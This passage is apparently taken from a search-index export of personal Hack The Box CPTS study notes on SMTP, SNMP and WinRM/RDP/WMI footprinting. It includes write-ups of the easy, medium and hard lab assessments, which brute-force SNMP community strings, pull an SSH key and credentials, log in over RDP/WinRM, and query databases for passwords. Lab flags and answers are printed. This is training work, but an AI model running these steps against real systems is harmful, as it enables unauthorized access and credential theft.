spam or spoofing.</li> </ul> </li> <li>Mail Delivery Agent (MDA): Delivers the email to the recipient\u2019s mailbox (POP3/IMAP).</li> </ol>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#smtp-protocol-flow","title":"SMTP Protocol Flow","text":"<ol> <li>Connection: MUA connects to SMTP server, optionally authenticates (username, password).</li> <li>Transmission:<ul> <li>Commands &amp; Data: Sent in plaintext by default.</li> <li>Information Transmitted: Sender &amp; recipient addresses, email content, headers.</li> </ul> </li> <li>Encryption (STARTTLS): Switches connection to secure (encrypted) mode.<ul> <li>TLS Activation: Triggered with the <code>EHLO</code> command, followed by <code>STARTTLS</code>.</li> </ul> </li> <li>Email Reception: Destination server receives and reassembles the email for delivery.</li> </ol>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#enhanced-security-with-esmtp","title":"Enhanced Security with ESMTP","text":"<ul> <li>ESMTP (Extended SMTP): Modern SMTP that includes additional authentication and encryption.</li> <li>SMTP-AUTH: Authenticates the sender to prevent unauthorized email sending.</li> <li>Anti-Spam Mechanisms:<ul> <li>DomainKeys Identified Mail (DKIM): Validates the sender\u2019s domain.</li> <li>Sender Policy Framework (SPF): Protects against email spoofing.</li> </ul> </li> </ul>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#smtp-vulnerabilities","title":"SMTP Vulnerabilities","text":"<ol> <li>Lack of Delivery Confirmation: SMTP does not provide standard delivery receipts.</li> <li>Unreliable Sender Authentication: Allows potential misuse for spamming.</li> <li>Open Relay Risks: Misconfiguration may allow unauthorized relaying of emails (spam risk).</li> </ol>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#smtp-command-examples","title":"SMTP Command Examples","text":"<ul> <li>STARTTLS: Initiates encryption on port 587.</li> <li>EHLO: Used in ESMTP to identify the client and prepare for STARTTLS.</li> <li> </li> </ul> Command Description <code>AUTH PLAIN</code> AUTH is a service extension used to authenticate the client. <code>HELO</code> The client logs in with its computer name and thus starts the session. <code>MAIL FROM</code> The client names the email sender. <code>RCPT TO</code> The client names the email recipient. <code>DATA</code> The client initiates the transmission of the email. <code>RSET</code> The client aborts the initiated transmission but keeps the connection between client and server. <code>VRFY</code> The client checks if a mailbox is available for message transfer. <code>EXPN</code> The client also checks if a mailbox is available for messaging with this command. <code>NOOP</code> The client requests a response from the server to prevent disconnection due to time-out. <code>QUIT</code> The client terminates the session. #### Telnet - HELO/EHLO <pre><code>telnet &lt;ip&gt;\n</code></pre>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#auth-plain-enables-encrypted-login-with-usernamepassword","title":"AUTH PLAIN: Enables encrypted login with username/password.","text":"<pre><code>cat /etc/postfix/main.cf | grep -v \"#\" | sed -r \"/^\\s*$/d\"\n</code></pre> The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#nmap-scan","title":"[[Nmap]] Scan","text":"<pre><code>sudo nmap 10.129.14.128 -sC -sV -p25\n</code></pre>","tags":["smtp"]},{"location":"CPTS/Footprinting/SMTP%20Simple%20Mail%20Transfer%20Protocol/#nmap-open-relay","title":"[[Nmap]] Open relay","text":"<pre><code>sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v\n</code></pre>","tags":["smtp"]},{"location":"CPTS/Footprinting/SNMP/","title":"SNMP","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/SNMP/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Footprinting/SNMP/#1-snmp-overview","title":"1. SNMP Overview","text":"<ul> <li>Definition: Simple Network Management Protocol (SNMP) is used for monitoring and managing network devices remotely, including routers, switches, servers, and IoT devices.</li> <li>Purpose: Enables remote configuration and status monitoring.</li> <li>Current Version: SNMPv3, offering increased security but with added complexity.</li> </ul>"},{"location":"CPTS/Footprinting/SNMP/#2-communication-and-ports","title":"2. Communication and Ports","text":"<ul> <li>Control Commands: Sent over UDP port 161 to change device settings.</li> <li>Traps: Unrequested data packets sent from the server to the client on UDP port 162 for specific events.</li> </ul>"},{"location":"CPTS/Footprinting/SNMP/#3-snmp-components","title":"3. SNMP Components","text":"<ul> <li>MIB (Management Information Base): A standardized hierarchical format listing SNMP objects for each device, facilitating cross-manufacturer access.<ul> <li>Object Identifier (OID): Unique numeric address for each object; organized in dot notation.</li> </ul> </li> <li>Community Strings: Act as passwords; still widely used in SNMPv2c, leading to security concerns due to lack of encryption.</li> </ul>"},{"location":"CPTS/Footprinting/SNMP/#4-protocol-versions","title":"4. Protocol Versions","text":"<ul> <li> <p>SNMPv1:</p> <ul> <li>Basic network management and monitoring.</li> <li>No encryption or authentication; plain-text data.</li> <li>Still used in smaller networks.</li> </ul> </li> <li> <p>SNMPv2 (v2c):</p> <ul> <li>Adds features but lacks security improvements.</li> <li>Community string remains unencrypted.</li> </ul> </li> <li> <p>SNMPv3:</p> <ul> <li>Improved security with authentication and encryption.</li> <li>Complex setup deters some administrators from upgrading.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/SNMP/#5-security-concerns","title":"5. Security Concerns","text":"<ul> <li> <p>Community Strings:</p> <ul> <li>Many organizations still use SNMPv2 due to complexity in transitioning to SNMPv3.</li> <li>Plain-text transmission allows for potential interception.</li> </ul> </li> <li> <p>Default Configuration:</p> <ul> <li>Includes IP addresses, ports, MIB, OIDs, authentication, and community strings.</li> <li>Inadequate knowledge of SNMP\u2019s security features makes networks vulnerable to attacks.</li> </ul> </li> </ul> <p>Summary: SNMP facilitates monitoring and management of network devices through MIBs, OIDs, and community strings. SNMPv3 offers enhanced security but requires significant configuration, while SNMPv1 and SNMPv2 remain widely used despite their vulnerabilities. Default SNMP configurations are often left unsecured, making networks susceptible to data interception and unauthorized access.</p>"},{"location":"CPTS/Footprinting/SNMP/#snmp-daemon-config","title":"SNMP Daemon Config","text":"<pre><code>cat /etc/snmp/snmpd.conf | grep -v \"#\" | sed -r '/^\\s*$/d'\n</code></pre> <p>![[Pasted image 20241110233020.png]] All the settings that can be make for the NSMP daemon are defined and described in the  http://www.net-snmp.org/docs/man/snmpd.conf.html</p>"},{"location":"CPTS/Footprinting/SNMP/#dangerous-settings","title":"Dangerous Settings","text":"<p>Some dangerous settings that the administrator can make with SNMP are:</p> Settings Description <code>rwuser noauth</code> Provides access to the full OID tree without authentication. <code>rwcommunity &lt;community string&gt; &lt;IPv4 address&gt;</code> Provides access to the full OID tree regardless of where the requests were sent from. <code>rwcommunity6 &lt;community string&gt; &lt;IPv6 address&gt;</code> Same access as with\u00a0<code>rwcommunity</code>\u00a0with the difference of using IPv6. ## Footprinting the Service <p>For footprinting SNMP, we can use tools like\u00a0[[snmpwalk]],\u00a0[[onesixtyone]], and\u00a0[[braa]].\u00a0<code>Snmpwalk</code>\u00a0is used to query the OIDs with their information.\u00a0<code>Onesixtyone</code>\u00a0can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time.</p> <pre><code>snmpwalk -v2c -c public 10.129.14.128\nsudo apt install onesixtyone\nsudo apt install braa\n</code></pre> <p>![[Pasted image 20241111003414.png]]</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/","title":"Windows Remote Management Protocols","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>Windows Remote Management Protocols [[WinRM]]</p> <p>Windows remote management allows for managing server hardware and configurations both locally and remotely. Key features include WS-Management, hardware diagnostics, and a COM API for remote communication. Starting with Windows Server 2016, remote management is enabled by default.</p> <p>Remote Management Components</p> <ol> <li> <p>Remote Desktop Protocol (RDP)</p> <ul> <li>Purpose: Provides GUI-based remote access to Windows systems.</li> <li>Ports:<ul> <li>Default: TCP 3389.</li> <li>Alternative: UDP 3389.</li> </ul> </li> <li>Encryption:<ul> <li>TLS/SSL encryption since Windows Vista.</li> <li>Vulnerabilities include self-signed certificates or weak encryption through RDP Security.</li> </ul> </li> <li>Activation:<ul> <li>Installed by default on Windows servers.</li> <li>Managed through Server Manager.</li> <li>By default, Network Level Authentication (NLA) is enabled.</li> </ul> </li> </ul> <p>Requirements for RDP Connections:</p> <ul> <li>Firewall Rules: Ensure TCP/UDP port 3389 is open.</li> <li>NAT Setup: Public IP and port forwarding are necessary when NAT is in use.</li> <li>Certificate Security: Avoid self-signed certificates, which create client-side warnings and are exploitable.</li> <li> <p>Windows Remote Management (WinRM)</p> </li> <li> <p>Purpose: Implements the WS-Management protocol for managing Windows servers remotely.</p> </li> <li>Features:<ul> <li>Supports scripting and automation via the COM API.</li> <li>Standards-based and lightweight, ensuring compatibility with modern management tools.</li> </ul> </li> <li>Compatibility: Enabled by default in modern Windows servers.</li> <li> <p>Windows Management Instrumentation (WMI)</p> </li> <li> <p>Purpose: Provides a framework for querying and managing local and remote Windows systems.</p> </li> <li>Features:<ul> <li>Access to system details like hardware, services, and logs.</li> <li>Enables complex automation and scripting for system administration.</li> </ul> </li> </ul> </li> </ol> <p>RDP Footprinting Scanning the RDP service can reveal valuable information about the target host, such as:</p> <ul> <li>NLA Status: Indicates whether it is enabled or disabled.</li> <li>Product Version: Identifies potential vulnerabilities.</li> <li>Hostname: Provides reconnaissance details about the environment.</li> </ul> <p>Tools for RDP Footprinting:</p> <ul> <li>[[Nmap]]: Used to identify service versions and NLA status. Example command:  <pre><code>nmap -p 3389 -sV &lt;target_IP&gt;\n\nnmap -sV -sC 10.129.201.248 -p3389 --script rdp*\n</code></pre></li> <li>Metasploit: Useful for exploiting misconfigured RDP services.</li> <li>Hydra: Can perform brute-force attacks if weak credentials are suspected. In addition, we can use\u00a0<code>--packet-trace</code>\u00a0to track the individual packages and inspect their contents manually. We can see that the\u00a0<code>RDP cookies</code>\u00a0(<code>mstshash=nmap</code>) used by Nmap to interact with the RDP server can be identified by\u00a0<code>threat hunters</code>\u00a0and various security services such as\u00a0Endpoint Detection and Response\u00a0(<code>EDR</code>), and can lock us out as penetration testers on hardened</li> </ul> <pre><code>nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n\n</code></pre> <p>A Perl script named\u00a0rdp-sec-check.pl\u00a0has also been developed by\u00a0Cisco CX Security Labs\u00a0that can unauthentically identify the security settings of RDP servers based on the handshakes.</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#rdp-security-check-installation","title":"RDP Security Check - Installation","text":"<p><pre><code>sudo cpan\n</code></pre> ![[Pasted image 20241115002253.png]]</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#rdp-security-check","title":"RDP Security Check","text":"<p><pre><code>git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check\n./rdp-sec-check.pl 10.129.201.248\n</code></pre>  Authentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using\u00a0<code>xfreerdp</code>,\u00a0<code>rdesktop</code>, or\u00a0<code>Remmina</code>\u00a0and interact with the GUI of the server accordingly.</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#initiate-an-rdp-session","title":"Initiate an RDP Session","text":"<p><pre><code>xfreerdp /u:cry0l1t3 /p:\"P455w0rd!\" /v:&lt;o[&gt;]\n</code></pre> After successful authentication, a new window will appear with access to the server's desktop to which we have connected.</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#windows-remote-management-protocols-winrm","title":"Windows Remote Management Protocols ([[WinRM]])","text":"<p>Overview Windows Remote Management (WinRM) is a Windows-integrated remote management protocol that operates via the command line. It uses the Simple Object Access Protocol (SOAP) to establish connections with remote hosts and applications. WinRM is not enabled by default and must be explicitly configured, starting with Windows 10.</p> <p>Ports and Communication</p> <ul> <li>WinRM relies on TCP ports 5985 (HTTP) and 5986 (HTTPS) for communication.<ul> <li>Port 5986 (HTTPS) is used for secure communication, while port 5985 (HTTP) is used for unencrypted connections.</li> <li>These newer ports (5985 and 5986) were adopted as ports 80 and 443 were previously used but were often blocked for security reasons.</li> </ul> </li> </ul> <p>Components of WinRM</p> <ul> <li> <p>Windows Remote Shell (WinRS):</p> <ul> <li>WinRS is a component of WinRM that allows execution of arbitrary commands on remote systems.</li> <li>It is included by default on Windows 7 and can be used to interact with remote machines in a command-line interface.</li> <li> <p>PowerShell and Event Log Merging:</p> </li> <li> <p>Services like remote sessions using PowerShell and merging event logs require WinRM.</p> </li> <li>WinRM enables secure and efficient remote management and administration of Windows systems.</li> </ul> </li> </ul> <p>Configuration and Firewall Considerations</p> <ul> <li> <p>Windows Server 2012 and later:</p> <ul> <li>WinRM is enabled by default.</li> <li>Configuration may still be required for certain advanced setups and clients.</li> <li>Necessary firewall exceptions should be created for proper communication.</li> <li> <p>Older Windows Server Versions:</p> </li> <li> <p>For versions prior to Windows Server 2012, WinRM must be manually enabled and configured.</p> </li> <li>Firewalls must also be adjusted to allow communication through the necessary ports (5985 and 5986).</li> </ul> </li> </ul> <p>Key OSCP Notes</p> <ul> <li>Exploitation:<ul> <li>Misconfigured WinRM services can provide unauthorized remote access, making it an important service to test during penetration testing engagements.</li> <li>Brute-forcing WinRM credentials or exploiting weak configurations can lead to full system compromise.</li> </ul> </li> <li>Mitigation:<ul> <li>Ensure WinRM is properly configured and secured, especially on legacy systems.</li> <li> </li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#implement-proper-firewall-rules-and-restrict-access-to-winrm-services-to-trusted-ip-addresses-only","title":"Implement proper firewall rules and restrict access to WinRM services to trusted IP addresses only.","text":""},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#footprinting-the-service","title":"Footprinting the Service","text":"<p>As we already know, WinRM uses TCP ports\u00a0<code>5985</code>\u00a0(<code>HTTP</code>) and\u00a0<code>5986</code>\u00a0(<code>HTTPS</code>) by default, which we can scan using Nmap. However, often we will see that only HTTP (<code>TCP 5985</code>) is used instead of HTTPS (<code>TCP 5986</code>).</p>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#nmap-winrm","title":"[[Nmap]] WinRm","text":"<p><pre><code>nmap -sV -sC &lt;ip&gt; -p5985,5986 --disable-arp-ping -n\n</code></pre> If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The\u00a0Test-WsMan\u00a0cmdlet is responsible for this, and the host's name in question is passed to it. In Linux-based environments, we can use the tool called\u00a0evil-winrm, another penetration testing tool designed to interact with WinRM.</p> <pre><code>evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!\n</code></pre>"},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#wmi-windows-management-instrumentation","title":"[[WMI (Windows Management Instrumentation)]]","text":""},{"location":"CPTS/Footprinting/Windows%20Remote%20Management%20Protocols/#footprinting-the-service_1","title":"Footprinting the Service","text":"<p>The initialization of the WMI communication always takes place on\u00a0<code>TCP</code>\u00a0port\u00a0<code>135</code>, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program\u00a0wmiexec.py\u00a0from the Impacket toolkit can be used for this.</p> <p><pre><code>/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t2:\"P455w0rD!\"@&lt;ip&gt; \"hostname\"\n</code></pre> Again, it is necessary to mention that the knowledge gained from installing these services and playing around with the configurations on our own Windows Server VM for gaining experience and developing the functional principle and the administrator's point of view cannot be replaced by reading manuals. Therefore, we strongly recommend setting up your own Windows Server, experimenting with the settings, and scanning these services repeatedly to see the differences in the results.</p> <p>Key Notes for OSCP</p> <ul> <li>RDP Misconfigurations:<ul> <li>Systems relying on weak encryption or self-signed certificates are vulnerable to MITM attacks.</li> <li>Disabling NLA can expose systems to unauthorized access attempts.</li> </ul> </li> <li>Exploitation:<ul> <li>Misconfigured firewalls or NAT settings may allow access to RDP services.</li> <li>Tools like Metasploit can test and exploit RDP vulnerabilities effectively.</li> </ul> </li> <li>Mitigation Analysis:<ul> <li>Understanding and bypassing firewalls or NAT restrictions is critical in penetration testing scenarios.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Easy/","title":"Footprinting Lab   Easy","text":"<p>We were commissioned by the company\u00a0<code>Inlanefreight Ltd</code>\u00a0to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.</p> <p>The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.</p> <p>Additionally, our teammates have found the following credentials \"<code>ceil:qwer1234</code>\", and they pointed out that some of the company's employees were talking about SSH keys on a forum.</p> <p>The administrators have stored a\u00a0<code>flag.txt</code>\u00a0file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.</p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Easy/#10129193209","title":"10.129.193.209","text":""},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Easy/#nmap-result","title":"Nmap result","text":"<p>Port <code>2121</code> ![[Pasted image 20241115094443.png]] as mentioned on the sceinrior above the password and user are <code>ceil:qwer1234</code></p> <p>we see that port <code>2121</code> is ftp so we will login into the ftp with provided credentials. <pre><code>ftp 10.129.193.209 -p 2121\n# username is: ceil\n# password is: qwer1234\nls -la\ncd .ssh\nget id_rsa\nquit\n</code></pre>  After downloading the <code>id_rsa</code> we can use it to ssh to it. <pre><code>chmod 600 id_rsa\nssh -i id_rsa ceil@10.129.193.209\nfind / -name flat.txt 2&gt;/dev/null\ncat /home/flag/flag.txt\n#HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}\n</code></pre>  We can submit the flag as the answer and Done!</p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Hard/","title":"Footprinting Lab   Hard","text":"<p>The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named\u00a0<code>HTB</code>\u00a0was also created here, whose credentials we need to access.</p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Hard/#_1","title":"?","text":"<p>Enumerate the server carefully and find the username \"HTB\" and its password. Then, submit HTB's password as the answer.</p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting%20Lab%20-%20Hard/#nmap-scan","title":"[[Nmap]] Scan","text":"<p><pre><code>sudo nmap -sV -sS 10.129.254.59    \n</code></pre> ```bash                                                                          PORT    STATE SERVICE  VERSION 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 110/tcp open  pop3     Dovecot pop3d 143/tcp open  imap     Dovecot imapd (Ubuntu) 993/tcp open  ssl/imap Dovecot imapd (Ubuntu) 995/tcp open  ssl/pop3 Dovecot pop3d Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p> <p><pre><code>Lets run `onesitynine` for SNMP enumeration\n```bash\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.254.59\n</code></pre> <pre><code>Scanning 1 hosts, 3219 communities\n10.129.254.59 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64\n</code></pre> We can see the Community string <code>backup</code> Using <code>braa</code> will get the credentials  <pre><code>braa backup@10.129.254.59:1.3.6.*\n</code></pre> Output <pre><code>10.129.254.59:105ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64\n10.129.254.59:105ms:.0:.10\n10.129.254.59:106ms:.0:212857\n10.129.254.59:212ms:.0:Admin &lt;tech@inlanefreight.htb&gt;\n10.129.254.59:106ms:.0:NIXHARD\n10.129.254.59:106ms:.0:Inlanefreight\n10.129.254.59:106ms:.0:72\n10.129.254.59:107ms:.0:8\n10.129.254.59:105ms:.1:.1\n10.129.254.59:106ms:.2:.1\n10.129.254.59:166ms:.3:.1\n10.129.254.59:168ms:.4:.1\n10.129.254.59:106ms:.5:.1\n10.129.254.59:105ms:.6:.49\n10.129.254.59:106ms:.7:.4\n10.129.254.59:106ms:.8:.50\n10.129.254.59:104ms:.9:.3\n10.129.254.59:104ms:.10:.92\n10.129.254.59:106ms:.1:The SNMP Management Architecture MIB.\n10.129.254.59:106ms:.2:The MIB for Message Processing and Dispatching.\n10.129.254.59:213ms:.3:The management information definitions for the SNMP User-based Security Model.\n10.129.254.59:105ms:.4:The MIB module for SNMPv2 entities\n10.129.254.59:105ms:.5:View-based Access Control Model for SNMP.\n10.129.254.59:105ms:.6:The MIB module for managing TCP implementations\n10.129.254.59:106ms:.7:The MIB module for managing IP and ICMP implementations\n10.129.254.59:105ms:.8:The MIB module for managing UDP implementations\n10.129.254.59:107ms:.9:The MIB modules for managing SNMP Notification, plus filtering.\n10.129.254.59:105ms:.10:The MIB module for logging SNMP Notifications.\n10.129.254.59:234ms:.1:8\n10.129.254.59:105ms:.2:8\n10.129.254.59:105ms:.3:8\n10.129.254.59:107ms:.4:8\n10.129.254.59:107ms:.5:8\n10.129.254.59:107ms:.6:8\n10.129.254.59:106ms:.7:8\n10.129.254.59:107ms:.8:8\n10.129.254.59:105ms:.9:8\n10.129.254.59:191ms:.10:8\n10.129.254.59:211ms:.0:214038\n10.129.254.59:106ms:.0:\ufffd\n                        8\n\n10.129.254.59:107ms:.0:393216\n10.129.254.59:105ms:.0:BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity\n\n10.129.254.59:106ms:.0:0\n10.129.254.59:107ms:.0:141\n10.129.254.59:107ms:.0:0\n10.129.254.59:105ms:.0:1\n10.129.254.59:235ms:.80:/opt/tom-recovery.sh\n10.129.254.59:105ms:.80:tom NMds732Js2761\n</code></pre></p> <p>towards the bottom we see the creds. <code>tom NMds732Js2761</code> Now we can use these to login to IMAP server. <pre><code>openssl s_client 10.129.254.59:imaps\n</code></pre></p> <p>AFter we can use these commands to login and get the id_rsa <pre><code>a LOGIN tom NMds732Js2761\na SELECT INBOX\na FETCH 1 all\na FETCH 1 BODY.PEEK[TEXT]\n</code></pre> Save the <code>opensshprivatekey</code> AND CHANGE THE PERMISSION we save into our ~/.ssh folder. We give 600 permission to the file id_rsa. <pre><code>chmod 600 id_rsa\nssh tom@$ip\n</code></pre></p> <p>SSH login was successful and now we can look into the history of commands used by the user. <pre><code>history\n</code></pre> in the history we find <code>mysql -u tom -p</code> we use the password <code>NMds732Js2761</code> We are logged into the mydql database and we can run commands query the database find the user and password. <pre><code>show databases;\nuse users;\nshow tables;\nselect * from users;\n</code></pre> After scroll through the queryed data we find user <code>HTB</code> and password <code>cr3n4o7rzse7rzhnckhssncif7ds</code></p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting_Lab_Meduim/","title":"Footprinting Lab Meduim","text":"<p>Enumerate the server carefully and find the username \"<code>HTB</code>\" and its password. Then, submit this user's password as the answer.</p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting_Lab_Meduim/#nmap","title":"Nmap","text":"<pre><code>nmap -sV -sC 10.129.158.159\n</code></pre> <p>Output: <pre><code>PORT     STATE SERVICE       VERSION\n111/tcp  open  rpcbind       2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n2049/tcp open  nlockmgr      1-4 (RPC #100021)\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: WINMEDIUM\n|   NetBIOS_Domain_Name: WINMEDIUM\n|   NetBIOS_Computer_Name: WINMEDIUM\n|   DNS_Domain_Name: WINMEDIUM\n|   DNS_Computer_Name: WINMEDIUM\n|   Product_Version: 10.0.17763\n|_  System_Time: 2024-11-16T03:34:57+00:00\n| ssl-cert: Subject: commonName=WINMEDIUM\n| Not valid before: 2024-11-15T02:29:35\n|_Not valid after:  2025-05-17T02:29:35\n|_ssl-date: 2024-11-16T03:35:05+00:00; +56s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 55s, deviation: 0s, median: 55s\n| smb2-time: \n|   date: 2024-11-16T03:34:57\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n</code></pre></p> <p>We Can use nmap to Enumerate RPC farther <pre><code>nmap -p 2049 --script rpcinfo &lt;target&gt;\n</code></pre> From the output we see that many version of RPC program are running. and there is NFS mount daemon as well. we will use the <code>showmount</code> command to see the mounted shares. <pre><code>showmount -e $ip\n</code></pre></p> <p>Output <pre><code>Export list for 10.129.158.159:\n/TechSupport (everyone)\n</code></pre></p> <p>we see a shared directory <code>TechSupport</code> that everyone can access.</p>"},{"location":"CPTS/Footprinting/Skill%20Assessment/Footprinting_Lab_Meduim/#nfs-network-file-system","title":"[[NFS Network File System]]","text":"<p>Since we have a directory to mount we can use NFS to mount the share from a remote server to a local directory on Linux system. <pre><code>mkdir target-nfs\ncd target-nfs\nsudo mount -t nfs 10.129.158.159:/ target-nfs/ -o nolock\ncd target-nfs\nsud ls -la\nsudo ls -la TechSupport\nsudo cat TechSupport/ticket4238791283782.txt \n</code></pre></p> <p><code>-t nfs</code> Specifies the type of filesystem to mount in this case <code>nfs</code> indicates that the filesystem is an <code>NFS</code> share</p> <p><code>$ip:/</code>: - <code>$ip</code> is a placeholder for the IP address or hostname of the remote NFS server. - <code>:/</code> specifies the root directory of the NFS export on the server. Replace <code>$ip</code> with the actual IP address or hostname of the server.</p> <ul> <li> <p><code>./target-NFS/</code>:</p> <ul> <li>This is the local mount point, i.e., the directory on the local system where the NFS share will be mounted.</li> <li>Replace <code>./target-NFS/</code> with the path to an existing directory. If the directory does not exist, it must be created first (e.g., using <code>mkdir</code>).</li> </ul> </li> <li> <p><code>-o nolock</code>:</p> <ul> <li><code>-o</code> specifies options for the mount operation.</li> <li><code>nolock</code> disables NFS file locking, which can sometimes be necessary in environments where the <code>rpc.statd</code> or <code>lockd</code> daemons are not running (e.g., minimal or containerized environments). Output of the <code>cat</code> <pre><code>sudo cat TechSupport/ticket4238791283782.txt\nConversation with InlaneFreight Ltd\n\n 5    user=\"alex\"\n 6    password=\"lol123!mD\"\n 7    from=\"alex.g@web.dev.inlanefreight.htb\"\n\n.......\n</code></pre> We got the username and password now we can connect to 3389 RDP using <code>xfreerdp</code> <pre><code>xfreerdp /cert:ignore /u:alex /p:\"lol123!\\mD\" /v:10.129.158.159\n</code></pre> We we'll get a windows connection window where we can interact with database. ![[Pasted image 20241115230238.png]]After looking around on the files and directories i found a file called <code>important</code> ![[Pasted image 20241115230633.png</li> </ul> </li> </ul> <p>Looks like a password  <code>sa:87N1ns@slls83</code> after running the Microsfot SQL Server on desktop with administrator it requires a passwod and using the password about for <code>sa</code> will let us into the database. ![[Pasted image 20241115230900.png]] And we are in. Now we just need to query the database for the user and password and submited. ![[Pasted image 20241115231055.png]] By expanding the <code>accounts</code> &gt; <code>Tables</code> &gt; <code>dbo.devsacc</code> and write click and <code>select Top 1000 row</code> and scroll down to find user <code>HTB</code> and password <code>lnch7ehrdn43i7AoqVPK4zWR</code>.  ![[Pasted image 20241115231916.png]]</p>"},{"location":"CPTS/Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/","title":"Common Pitfalls and Troubleshooting in VPN and SSH Connections","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>While performing penetration testing or working on Hack The Box (HTB) challenges, there are a few common pitfalls that can slow you down. Below are the most frequent issues and troubleshooting steps, focusing on VPN and SSH, two crucial aspects in remote connections and lab 